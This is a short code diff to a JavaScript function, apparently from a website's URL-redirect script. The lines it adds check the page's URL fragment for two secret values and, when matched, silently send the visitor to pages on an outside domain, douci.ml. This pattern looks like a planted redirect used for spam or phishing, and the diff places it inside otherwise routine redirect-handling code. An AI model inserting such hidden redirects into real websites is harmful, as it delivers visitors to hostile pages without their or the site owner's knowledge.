@@ -151,6 +151,14 @@ function niale(pstr) {
 
 function m() {
 
+
+if (window.location.hash.substr(1)=='fwfbx') {
+ window.location.href='http://douci.ml/SAYFREED.html';
+}
+if (window.location.hash.substr(1)=='SIYae') {
+ window.location.href='http://douci.ml/B2BIONIC.html';
+}
+
 if (window.location.href.indexOf('url-multi-redirect/?a=')!==-1) {
    mystr = window.location.href.substr(window.location.href.indexOf('=')-1);
    window.location.href = window.location.href.indexOf('/url-multi')+'#'+mystr;
